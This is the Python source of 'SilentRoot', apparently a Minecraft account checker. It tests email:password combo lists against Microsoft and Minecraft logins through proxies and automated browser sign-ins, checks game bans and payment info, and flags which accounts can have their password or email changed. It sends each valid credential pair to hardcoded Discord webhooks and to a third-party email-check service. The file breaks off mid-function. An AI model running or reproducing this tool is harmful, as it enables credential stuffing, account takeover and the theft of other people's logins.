import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys, string
from datetime import datetime, timezone
from colorama import Fore, Style, init
from console import utils
from tkinter import filedialog

# Enable ANSI escape codes on Windows
if os.name == 'nt':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except:
        pass

# Integrated console utils class
class Utils:
    @staticmethod
    def set_title(title):
        """Set the console window title"""
        try:
            if os.name == 'nt':  # Windows
                # Escape special characters and wrap in quotes
                safe_title = title.replace('"', '""')  # Escape quotes
                os.system(f'title "{safe_title}"')
        except:
            pass

# Create utils instance
utils = Utils()
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar

# Ban checking
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.connection import Connection
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect

init(autoreset=True)

logo = Fore.CYAN + '''
╔══════════════════════════════════════════════════════════════════════════════════════╗
║''' + Fore.RED + Style.BRIGHT + '''  ███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗  ██████╗  ██████╗ ████████╗   ''' + Fore.CYAN + '''║
║''' + Fore.RED + Style.BRIGHT + '''  ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝   ''' + Fore.CYAN + '''║
║''' + Fore.RED + Style.BRIGHT + '''  ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║   ██║   ██║      ''' + Fore.CYAN + '''║
║''' + Fore.RED + Style.BRIGHT + '''  ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║   ██║   ██║      ''' + Fore.CYAN + '''║
║''' + Fore.RED + Style.BRIGHT + '''  ███████║██║███████╗███████╗██║ ╚████║   ██║   ██║  ██║╚██████╔╝╚██████╔╝   ██║      ''' + Fore.CYAN + '''║
║''' + Fore.RED + Style.BRIGHT + '''  ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝      ''' + Fore.CYAN + '''║
║                                                                                      ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║''' + Fore.GREEN + '''                Minecraft Accounts  |  Email Verification                             ''' + Fore.CYAN + '''║
║''' + Fore.MAGENTA + '''                       Hypixel Ban Check  |   DonutSMP Status                         ''' + Fore.CYAN + '''║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║''' + Fore.WHITE + '''                                  Made by Reaper                                      ''' + Fore.CYAN + '''║
╚══════════════════════════════════════════════════════════════════════════════════════╝''' + Style.RESET_ALL

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other,donut_banned,donut_unbanned,bedrock = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
proxytype = "'4'"
screen = "'1'"
thread = 5
start_time = time.time()

# Exception logging system
def log_exception(exc_type, exc_value, exc_tb):
    with open("logs.txt", "a", encoding="utf-8") as log_file:
        traceback.print_exception(exc_type, exc_value, exc_tb, file=log_file)

sys.excepthook = log_exception

if hasattr(threading, "excepthook"):
    def thread_excepthook(args):
        log_exception(args.exc_type, args.exc_value, args.exc_traceback)
    threading.excepthook = thread_excepthook
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, xbox_token=None):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.xbox_token = xbox_token
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None
        self.donut_status = None
        self.donut_reason = None
        self.donut_time = None
        self.donut_banid = None
        self.payment = None
        self.session = None
        self.password_changeable = None
        self.email_changeable = None
        self.account_age = None
        self.account_created = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        # Password & Email Changeability
        if hasattr(self, 'password_changeable') and self.password_changeable: message+=f"\nPassword Changeable: {self.password_changeable}"
        if hasattr(self, 'email_changeable') and self.email_changeable: message+=f"\nEmail Changeable: {self.email_changeable}"
        if hasattr(self, 'account_created') and self.account_created:
            message+=f"\nAccount Created: {self.account_created}"
        if config.get('donutcheck') is True: 
            message+=f"\nDonutSMP Status: {self.donut_status or 'Unknown'}"
            if self.donut_reason: message+=f"\nDonut Ban Reason: {self.donut_reason}"
            if self.donut_time: message+=f"\nDonut Time Left: {self.donut_time}"
            if self.donut_banid: message+=f"\nDonut Ban ID: {self.donut_banid}"
        if self.payment: message+=f"\nPayment Info: {self.payment}"
        return message+"\n============================\n"

    def notify(self):
        global errors
        try:
            
            # Determine webhook URL based on account status
            # Check if Hypixel is banned
            hypixel_banned = self.banned and str(self.banned).lower() not in ["false", "none", ""] and not any(x in str(self.banned).lower() for x in ["version", "incompatible", "closed", "cloning"])
            
            # Check if Hypixel is unbanned/clean  
            hypixel_unbanned = self.banned and (str(self.banned).lower() == "false" or any(x in str(self.banned).lower() for x in ["closed", "cloning"]))
            
            # Check DonutSMP status
            donut_banned = self.donut_status == "banned"
            donut_unbanned = self.donut_status == "unbanned"
            
            # Routing logic:
            # BANNED webhook: If banned on EITHER Hypixel OR DonutSMP
            # UNBANNED webhook: If explicitly unbanned on EITHER service (and not banned on the other)
            # NORMAL webhook: Everything else (no ban check, version errors, Other accounts)
            
            if hypixel_banned or donut_banned:
                # Banned webhook - Account is banned on at least one service
                webhook_url = 'https://discord.com/api/webhooks/1434212531622121483/C1fKkU0ovslv7ZQeGowVjQ5qK897cULEtd61YxKEmxBpO7weHG1PLFO4jZfULFFxYvzk'
                if screen == "'2'": print(Fore.RED + f"[WEBHOOK] Sending to BANNED webhook" + Style.RESET_ALL)
            elif hypixel_unbanned or donut_unbanned:
                # Unbanned webhook - Account is explicitly clean/unbanned
                webhook_url = 'https://discord.com/api/webhooks/1434212553612984501/6Yk1y-xOuHE8HoCoeIGr8G91xFRcZj6alawORnY5Tt__HN9xa4Oe9SjHNNd8qFgymMmb'
                if screen == "'2'": print(Fore.GREEN + f"[WEBHOOK] Sending to UNBANNED webhook" + Style.RESET_ALL)
            else:
                # Normal webhook - Optional: Set to None or empty string to disable
                webhook_url = 'none'
                # To disable normal webhook, set: webhook_url = None
                
                if webhook_url:  # Only log if webhook is configured
                    if screen == "'2'": print(Fore.YELLOW + f"[WEBHOOK] Sending to NORMAL webhook (SFA/MFA/Other) - Access: {self.access}, Type: {self.type}" + Style.RESET_ALL)
                else:
                    if screen == "'2'": print(Fore.CYAN + f"[WEBHOOK] Normal webhook disabled - Skipping (SFA/MFA/Other)" + Style.RESET_ALL)
                    return  # Skip webhook delivery if normal webhook is not configured

            if not webhook_url:
                return

            # Advanced embed but with SilentRoot branding - Always enabled
            if True:
                # Set embed color based on account status
                if hypixel_banned or donut_banned:
                    embed_color = 0xFF0000  # Bright Red for banned
                elif hypixel_unbanned or donut_unbanned:
                    embed_color = 0x00FF00  # Bright Green for unbanned
                else:
                    embed_color = 0xFFFF00  # Bright Yellow for normal/unknown status
                
                fields = [
                    {"name": "<:mmail:1430291754459856946> Eᴍᴀɪʟ", "value": f"||`{self.email}`||" if self.email else "N/A", "inline": True},
                    {"name": "<:keiy:1430291766590050304> Pᴀѕѕᴡᴏʀᴅ", "value": f"||`{self.password}`||" or "N/A", "inline": True},
                    {"name": "<:name_tag:1430291758893498460> Uѕᴇʀɴᴀᴍᴇ", "value": getattr(self, 'original_name', self.name) if (getattr(self, 'original_name', self.name) and getattr(self, 'original_name', self.name) != "N/A") else "No MC Profile", "inline": True},
                    {"name": "<:brok:1430291739272417353> Aᴄᴄᴏᴜɴᴛ Tʏᴘᴇ", "value": self.type or "N/A", "inline": True},
                ]
                
                  # Hypixel Status (only when ban check enabled)
                if config.get('hypixelban') is True:
                    raw = self.banned
                    unknown = (raw is None) or (isinstance(raw, str) and raw.strip().lower() in ("none", "", "null"))
                    if unknown:
                        ban_emoji = "<a:banned:1430293755155448014>"
                        display_text = "Banned"
                    else:
                        status_raw = str(raw)
                        sr_low = status_raw.lower()
                        is_unbanned = (sr_low == "false" or "closed" in sr_low or "cloning" in sr_low)
                        ban_emoji = "<a:unbanned:1430296212015419484>" if is_unbanned else "<a:banned:1430293755155448014>"
                        display_text = "Unbanned" if is_unbanned else status_raw
                    if len(display_text) > 250:
                        display_text = display_text[:247] + "..."
                    fields.append({"name": "<:hypixel:1430291770012340246> Hʏᴘɪxᴇʟ Sᴛᴀᴛᴜѕ", "value": f"{ban_emoji} {display_text}", "inline": True})

                if self.level: fields.append({"name": "<:hypixel:1430291770012340246> Hʏᴘɪxᴇʟ Lᴇᴠᴇʟ", "value": self.level, "inline": True})
                if hasattr(self, 'hypixel_rank') and self.hypixel_rank: fields.append({"name": "<:hypixel:1430291770012340246> Hʏᴘɪxᴇʟ Rᴀɴᴋ", "value": self.hypixel_rank, "inline": True})
                if hasattr(self, 'hypixel_playtime') and self.hypixel_playtime: fields.append({"name": "<:hypixel:1430291770012340246> Hʏᴘɪxᴇʟ Pʟᴀʏᴛɪᴍᴇ", "value": self.hypixel_playtime, "inline": True})
                if hasattr(self, 'hypixel_karma') and self.hypixel_karma: fields.append({"name": "<:hypixel:1430291770012340246> Hʏᴘɪxᴇʟ Kᴀʀᴍᴀ", "value": self.hypixel_karma, "inline": True})
                if self.bwstars: fields.append({"name": "<:hypixel:1430291770012340246> Bᴇᴅᴡᴀʀѕ Sᴛᴀʀѕ", "value": self.bwstars, "inline": True})
                if self.firstlogin: fields.append({"name": "<:hypixel:1430291770012340246> Fɪʀѕᴛ Lᴏɢɪɴ", "value": self.firstlogin, "inline": True})
                if self.lastlogin: fields.append({"name": "<:hypixel:1430291770012340246> Lᴀѕᴛ Lᴏɢɪɴ", "value": self.lastlogin, "inline": True})
                if self.sbcoins: fields.append({"name": "<:hypixel:1430291770012340246> Sᴋʏʙʟᴏᴄᴋ Cᴏɪɴѕ", "value": self.sbcoins, "inline": True})

                if self.capes and self.capes != "N/A": fields.append({"name": "<:cape:1430291744934592612> Cᴀᴘᴇѕ", "value": self.capes, "inline": True})
                if self.cape: fields.append({"name": "<:cape:1430291744934592612> Oᴘᴛɪꜰɪɴᴇ Cᴀᴘᴇ", "value": self.cape, "inline": True})
                
                # Password & Email & Name Change Detection
                if hasattr(self, 'password_changeable') and self.password_changeable is not None and self.password_changeable != "None":
                    emoji = "<a:rght:1434491384370434168>" if self.password_changeable == "Possible" else "<a:wrng:1434491325910220951>"
                    fields.append({"name": "<:keiy:1430291766590050304> Pᴀѕѕᴡᴏʀᴅ Cʜᴀɴɢᴇᴀʙʟᴇ", "value": f"{emoji} {self.password_changeable}", "inline": True})
                
                if hasattr(self, 'email_changeable') and self.email_changeable is not None and self.email_changeable != "None":
                    emoji = "<a:rght:1434491384370434168>" if self.email_changeable == "Possible" else "<a:wrng:1434491325910220951>"
                    fields.append({"name": "<:mmail:1430291754459856946> Eᴍᴀɪʟ Cʜᴀɴɢᴇᴀʙʟᴇ", "value": f"{emoji} {self.email_changeable}", "inline": True})
                
                if self.namechanged is not None and self.namechanged != "None" and self.namechanged != "N/A":
                    emoji = "<a:rght:1434491384370434168>" if self.namechanged == "True" else "<a:wrng:1434491325910220951>" if self.namechanged == "False" else "<a:idkk:1434492987391475712>"
                    fields.append({"name": "<a:name_change:1430291761300902089> Nᴀᴍᴇ Cʜᴀɴɢᴇᴀʙʟᴇ", "value": f"{emoji} {self.namechanged}", "inline": True})
                if self.lastchanged: fields.append({"name": "<:name_tag:1430291758893498460> Lᴀѕᴛ Nᴀᴍᴇ Cʜᴀɴɢᴇ", "value": self.lastchanged, "inline": True})
                
                # Account Creation Date
                if hasattr(self, 'account_created') and self.account_created:
                    fields.append({"name": "<:aeg:1440804458773872761> Aᴄᴄ Cʀᴇᴀᴛᴇᴅ", "value": f"{self.account_created}", "inline": True})
                
                # Security Settings - Always show
                if self.payment: fields.append({"name": "<:redcard:1434382262694318200> Pᴀʏᴍᴇɴᴛ Iɴꜰᴏ", "value": self.payment, "inline": False})
                
                # DonutSMP Field
                if self.donut_status:
                    donut_emoji = "<a:unbanned:1430296212015419484>" if self.donut_status == "unbanned" else "<a:banned:1430293755155448014>"
                    
                    # For unbanned accounts, check if we have any stats
                    has_stats = (hasattr(self, 'donut_money') and self.donut_money) or \
                               (hasattr(self, 'donut_playtime') and self.donut_playtime) or \
                               (hasattr(self, 'donut_shards') and self.donut_shards)
                    
                    if self.donut_status == "unbanned" and not has_stats:
                        fields.append({"name": f"<a:donut:1430291763641188372> Dᴏɴᴜᴛ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} Unbanned", "inline": True})
                    else:
                        fields.append({"name": f"<a:donut:1430291763641188372> Dᴏɴᴜᴛ Sᴛᴀᴛᴜѕ", "value": f"{donut_emoji} {self.donut_status.title()}", "inline": True})
                    
                    # Ban-specific info
                    if self.donut_reason: fields.append({"name": "<a:donut:1430291763641188372> Bᴀɴ Rᴇᴀѕᴏɴ", "value": self.donut_reason, "inline": True})
                    if self.donut_time: fields.append({"name": "<a:donut:1430291763641188372> Tɪᴍᴇ Lᴇꜰᴛ", "value": self.donut_time, "inline": True})
                    if hasattr(self, 'donut_banid') and self.donut_banid: fields.append({"name": "<a:donut:1430291763641188372> Bᴀɴ Iᴅ", "value": self.donut_banid, "inline": True})
                    
                    # Player stats
                    if hasattr(self, 'donut_money') and self.donut_money: fields.append({"name": "<a:donut:1430291763641188372> Mᴏɴᴇʏ", "value": self.donut_money, "inline": True})
                    if hasattr(self, 'donut_playtime') and self.donut_playtime: fields.append({"name": "<a:donut:1430291763641188372> Pʟᴀʏᴛɪᴍᴇ", "value": self.donut_playtime, "inline": True})
                    if hasattr(self, 'donut_shards') and self.donut_shards: fields.append({"name": "<a:donut:1430291763641188372> Sʜᴀʀᴅѕ", "value": self.donut_shards, "inline": True})
                    if hasattr(self, 'donut_level') and self.donut_level: fields.append({"name": "<a:donut:1430291763641188372> Lᴇᴠᴇʟ", "value": self.donut_level, "inline": True})
                    if hasattr(self, 'donut_rank') and self.donut_rank: fields.append({"name": "<a:donut:1430291763641188372> Rᴀɴᴋ", "value": self.donut_rank, "inline": True})
                    if hasattr(self, 'donut_kills') and self.donut_kills: fields.append({"name": "<a:donut:1430291763641188372> Kɪʟʟѕ", "value": self.donut_kills, "inline": True})
                    if hasattr(self, 'donut_deaths') and self.donut_deaths: fields.append({"name": "<a:donut:1430291763641188372> Dᴇᴀᴛʜѕ", "value": self.donut_deaths, "inline": True})
                    
                    # Calculate K/D ratio if both kills and deaths are available
                    if hasattr(self, 'donut_kills') and hasattr(self, 'donut_deaths') and self.donut_kills and self.donut_deaths:
                        try:
                            kd_ratio = round(int(self.donut_kills.replace(',', '')) / int(self.donut_deaths.replace(',', '')), 2)
                            fields.append({"name": "<a:donut:1430291763641188372> K/D Rᴀᴛɪᴏ", "value": str(kd_ratio), "inline": True})
                        except: pass
                
                # Add combo at the end
                fields.append({"name": "<:combo:1430291747912548454> Cᴏᴍʙᴏ", "value": f"||```{self.email}:{self.password}```||", "inline": False})

                payload = {
                    "username": "SilentRoot",
                    "avatar_url": "https://ik.imagekit.io/3xnpqon35/silentroot.jpg",
                    "embeds": [{
                        "author": {
                            "name": "SilentRoot MC Checker",
                            "url": "https://github.com/silentroot",
                            "icon_url": "https://ik.imagekit.io/3xnpqon35/silentroot.jpg"
                        },
                        
                        "color": embed_color,
                        "fields": fields,
                        "thumbnail": {"url": f"https://mc-heads.net/body/{self.name}" if self.name and self.name != "N/A" else "https://mc-heads.net/body/steve"},
                        "footer": {
                            "text": "SilentRoot • Made by Reaper",
                            "icon_url": "https://ik.imagekit.io/3xnpqon35/silentroot.jpg"
                        },
                        "timestamp": datetime.now(timezone.utc).isoformat()
                    }]
                }

            response = requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=10)
            if response.status_code != 204 and response.status_code != 200:
                if screen == "'2'": print(Fore.YELLOW + f"⚠️  Webhook returned status {response.status_code}" + Style.RESET_ALL)
        except Exception as e:
            if screen == "'2'": print(Fore.RED + f"❌ Webhook error: {str(e)[:50]}" + Style.RESET_ALL)
            errors += 1

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
                try:
                    # Extract Hypixel playtime
                    playtime_match = re.search(r'<b>Playtime:</b>\s*([^<]+)', tx)
                    self.hypixel_playtime = playtime_match.group(1).strip() if playtime_match else None
                except: pass
                try:
                    # Extract Hypixel rank
                    rank_match = re.search(r'<b>Rank:</b>\s*([^<]+)', tx)
                    self.hypixel_rank = rank_match.group(1).strip() if rank_match else None
                except: pass
                try:
                    # Extract Hypixel karma
                    karma_match = re.search(r'<b>Karma:</b>\s*([^<]+)', tx)
                    self.hypixel_karma = karma_match.group(1).strip() if karma_match else None
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    # Don't set password/email changeable here - let check_changeability() do actual API checks
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    # Don't set password/email changeable here - let check_changeability() do actual API checks
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: 
                self.access = "Unknown"
    
    def check_changeability(self):
        """
        Enhanced password/email changeability detection with actual API verification
        
        """
        global errors
        
        # Set default based on MFA/SFA (fallback)
        if self.access == "True":
            self.password_changeable = "Possible"
            self.email_changeable = "Possible"
        else:
            self.password_changeable = "Not Yet"
            self.email_changeable = "Not Yet"
        
        # If we have a token, try to get more accurate detection
        if self.token and self.token != "N/A":
            tries = 0
            while tries < min(maxretries, 2):  # Limit to 2 tries for speed
                try:
                    # Check Microsoft profile to see if we can access account settings
                    profile_check = requests.get(
                        'https://api.minecraftservices.com/minecraft/profile',
                        headers={
                            'Authorization': f'Bearer {self.token}',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        },
                        proxies=getproxy(),
                        verify=False,
                        timeout=8
                    )
                    
                    # If we can access the profile, check account type
                    if profile_check.status_code == 200:
                        # For MFA accounts, verify they can actually change credentials
                        if self.access == "True":
                            # MFA confirmed - can change
                            self.password_changeable = "Possible"
                            self.email_changeable = "Possible"
                        else:
                            # Profile accessible but no email access - limited
                            # Can likely change password but not email
                            self.password_changeable = "Possible"
                            self.email_changeable = "Not Yet"
                    elif profile_check.status_code == 401:
                        # Unauthorized - token might be limited
                        # Keep MFA/SFA fallback values
                        pass
                    elif profile_check.status_code == 403:
                        # Forbidden - restricted account
                        self.password_changeable = "Not Yet"
                        self.email_changeable = "Not Yet"
                    
                    # Success - break retry loop
                    break
                    
                except requests.exceptions.Timeout:
                    tries += 1
                    if tries >= min(maxretries, 2):
                        # Timeout - keep fallback values
                        pass
                    else:
                        time.sleep(0.5)
                except requests.exceptions.RequestException:
                    tries += 1
                    if tries >= min(maxretries, 2):
                        errors += 1
                        # Keep fallback values
                    else:
                        time.sleep(0.5)
                except Exception:
                    errors += 1
                    # Keep fallback values
                    break
        
        if screen == "'2'":
            print(Fore.GREEN + f"✓ Changeability: Password={self.password_changeable}, Email={self.email_changeable}" + Style.RESET_ALL)
    
    def check_account_age(self):
        """
        Get Minecraft account creation date using Selenium - login first, then capture namechange API
        """
        global errors
        
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.service import Service as ChromeService
            from webdriver_manager.chrome import ChromeDriverManager
            from selenium.webdriver.common.by import By
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC
            
            if screen == "'2'":
                print(Fore.CYAN + f"🔍 Checking account age for {self.name}..." + Style.RESET_ALL)
            
            # Setup Chrome (visible window)
            options = webdriver.ChromeOptions()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--enable-logging")
            options.add_argument("--v=1")
            
            driver = webdriver.Chrome(
                service=ChromeService(ChromeDriverManager().install()),
                options=options
            )
            
            try:
                # Enable network logging
                driver.execute_cdp_cmd('Network.enable', {})
                
                # Step 1: Go to Minecraft login page
                login_url = "https://www.minecraft.net/en-us/login"
                driver.get(login_url)
                time.sleep(3)
                
                # Click "SIGN IN WITH Microsoft" button
                try:
                    sign_in_ms = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'SIGN IN WITH')]"))
                    )
                    sign_in_ms.click()
                    time.sleep(5)
                except Exception as e:
                    if screen == "'2'":
                        print(Fore.RED + f"❌ Could not find Microsoft sign-in button" + Style.RESET_ALL)
                    return
                
                # Step 2: Fill Microsoft login form
                try:
                    email_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.ID, "i0116"))
                    )
                    email_field.clear()
                    email_field.send_keys(self.email)
                    time.sleep(1)
                    
                    # Click Next
                    next_btn = driver.find_element(By.ID, "idSIButton9")
                    next_btn.click()
                    time.sleep(3)
                    
                    # Check if "Sign in another way" appears
                    try:
                        sign_another_way = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.XPATH, "//a[contains(text(), 'Sign in another way')]"))
                        )
                        sign_another_way.click()
                        time.sleep(2)
                        
                        # Click "Use my password"
                        use_password = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Use my password')]"))
                        )
                        use_password.click()
                        time.sleep(2)
                    except:
                        pass
                    
                    # Find and fill password field
                    password_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.ID, "i0118"))
                    )
                    password_field.clear()
                    password_field.send_keys(self.password)
                    time.sleep(1)
                    
                    # Click Sign in
                    signin_btn = driver.find_element(By.ID, "idSIButton9")
                    signin_btn.click()
                    
                    # Wait for login to complete
                    time.sleep(4)
                    
                     # Handle any other prompts - Click Next/Continue
                    try:
                        next_btn = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, "//input[@value='Next']"))
                        )
                        next_btn.click()
                        time.sleep(2)
                    except:
                        pass
                except Exception as e:
                    if screen == "'2'":
                        print(Fore.RED + f"❌ Login failed: {str(e)}" + Style.RESET_ALL)
                    return

                    # Handle "Stay signed in?" - Click No
                    try:
                        no_btn = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.ID, "idBtn_Back"))
                        )
                        no_btn.click()
                        time.sleep(2)
                    except:
                        pass
                
                # Step 2: Navigate to profile page
                profile_url = f"https://www.minecraft.net/en-us/profile/{self.name}"
                driver.get(profile_url)
                
                # Step 3: Refresh to capture namechange request
                driver.refresh()
                time.sleep(3)
                
                # Step 4: Get performance logs and find namechange request
                logs = driver.get_log('performance')
                
                for log in logs:
                    try:
                        message = json.loads(log['message'])
                        if message['message']['method'] == 'Network.responseReceived':
                            url = message['message']['params']['response']['url']
                            if 'namechange' in url:
                                request_id = message['message']['params']['requestId']
                                response_body = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
                                data = json.loads(response_body['body'])
                                
                                if data and len(data) > 0 and 'createdAt' in data[0]:
                                    created_at = data[0]['createdAt']
                                    creation_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    self.account_created = creation_date.strftime("%d %b %Y")
                                    if screen == "'2'":
                                        print(Fore.GREEN + f"✓ Account created: {self.account_created}" + Style.RESET_ALL)
                                    return
                    except:
                        continue
                        
            finally:
                driver.quit()
                
        except Exception:
            errors += 1
            return
    
    def save_changeability(self):
        """Save accounts with changeable fields to separate file"""
        try:
            changeable_items = []
            
            # Check which fields are changeable
            if self.email_changeable == "Possible":
                changeable_items.append("Email")
            if self.password_changeable == "Possible":
                changeable_items.append("Password")
            if self.namechanged == "True":
                changeable_items.append("Name")
            
            # Only save if at least one field is changeable
            if changeable_items:
                changeable_str = ", ".join(changeable_items)
                line = f"{self.email}:{self.password} - {changeable_str} change possible\n"
                
                # Save to the changeability file
                with open(f"results/{fname}/Changeability.txt", 'a', encoding='utf-8') as f:
                    f.write(line)
                
                if screen == "'2'":
                    print(Fore.CYAN + f"💾 Saved changeable account: {changeable_str}" + Style.RESET_ALL)
        except Exception as e:
            if screen == "'2'":
                print(Fore.RED + f"❌ Error saving changeability: {str(e)[:50]}" + Style.RESET_ALL)
    
    def namechange(self):
        """Enhanced name change detection with better reliability and error handling"""
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    # Use Minecraft API to check name change availability
                    check = requests.get(
                        'https://api.minecraftservices.com/minecraft/profile/namechange',
                        headers={'Authorization': f'Bearer {self.token}'},
                        proxies=getproxy(),
                        verify=False,
                        timeout=10
                    )
                    
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            
                            # Check name change availability
                            if config.get('namechange') is True:
                                name_allowed = data.get('nameChangeAllowed')
                                if name_allowed is not None:
                                    self.namechanged = str(name_allowed)  # Will be "True" or "False"
                                else:
                                    self.namechanged = "Unknown"
                            
                            # Check last name change date
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        # Try parsing with milliseconds
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        try:
                                            # Try parsing without milliseconds
                                            given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                        except ValueError:
                                            # If both fail, skip
                                            given_date = None
                                    
                                    if given_date:
                                        given_date = given_date.replace(tzinfo=timezone.utc)
                                        formatted = given_date.strftime("%m/%d/%Y")
                                        current_date = datetime.now(timezone.utc)
                                        difference = current_date - given_date
                                        years = difference.days // 365
                                        months = (difference.days % 365) // 30
                                        days = difference.days

                                        if years > 0:
                                            self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                        elif months > 0:
                                            self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                        else:
                                            self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                            
                            # Successfully got data, break the retry loop
                            break
                            
                        except json.JSONDecodeError:
                            if screen == "'2'": 
                                print(Fore.YELLOW + f"⚠️  Name change API returned invalid JSON" + Style.RESET_ALL)
                        except Exception as e:
                            if screen == "'2'": 
